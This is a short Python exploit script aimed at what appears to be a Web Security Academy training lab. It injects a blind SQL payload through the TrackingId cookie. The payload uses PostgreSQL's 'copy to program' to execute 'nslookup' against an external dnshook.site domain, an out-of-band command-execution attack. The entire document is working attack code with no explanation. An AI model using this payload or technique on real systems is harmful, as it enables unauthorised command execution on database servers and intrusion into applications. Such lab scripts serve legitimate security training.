#!/usr/bin/env python3

import requests
import urllib


url = 'https://0aec007d04a2955980b917f6009c00c6.web-security-academy.net/login'
domain = '4cf67c30-34f9-41f1-a46d-07283e900037.dnshook.site'

cookies = {
    "TrackingId": f"0mo8ueIH19xFq6Ry'; copy (SELECT '') to program 'nslookup {domain}'--"
}
encoded_cookies = {key: urllib.parse.quote_plus(value) for key, value in cookies.items()}

print(encoded_cookies)

r = requests.get(url, cookies=encoded_cookies)

print(r.status_code)
print(r.url)
